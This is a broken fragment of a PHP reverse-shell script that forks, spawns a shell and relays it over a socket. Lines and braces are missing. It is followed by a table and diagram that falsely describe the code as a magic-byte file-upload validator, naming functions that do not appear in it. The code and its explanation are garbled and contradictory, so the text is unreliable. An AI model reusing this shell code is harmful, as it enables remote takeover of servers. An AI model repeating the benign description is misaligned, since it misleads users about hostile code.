````
	$pid = pcntl_fork();

		exit(1);
	}

		exit(0);  // Parent exits

   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
````

This **PHP** code is a file upload handler that checks whether an uploaded file has a valid magic byte signature before saving it.

| Code                                              | Purpose                                                              |
| ------------------------------------------------- | -------------------------------------------------------------------- |
| `session_start();`                                | Starts the user session.                                             |
| `require 'config.php';`                           | Loads the configuration file.                                        |
| `$uploadPath = 'uploads/';`                       | Specifies where uploaded files will be stored.                       |
| `checkMagicBytes()`                               | Reads the first **4 bytes** of the uploaded file.                    |
| `$validMagicBytes`                                | Stores the allowed file signatures (magic bytes).                    |
| `jpg => ffd8ffe0`                                 | Valid JPEG file signature.                                           |
| `png => 89504e47`                                 | Valid PNG file signature.                                            |
| `bmp => 424d`                                     | Valid BMP file signature.                                            |
| `checkMagicBytes($fileTmpPath, $validMagicBytes)` | Verifies the uploaded file's magic bytes.                            |
| `move_uploaded_file()`                            | Saves the file into the `uploads/` directory if validation succeeds. |
| `echo json_encode(...)`                           | Returns a success or error message in JSON format.                   |

Upload Flow
````
User Uploads File
        │
        ▼
Read First 4 Bytes
        │
        ▼
Compare with Valid Magic Bytes
        │
   ┌────┴────┐
   │         │
Valid     Invalid
   │         │
   ▼         ▼
Move File   Return Error
to uploads/
````
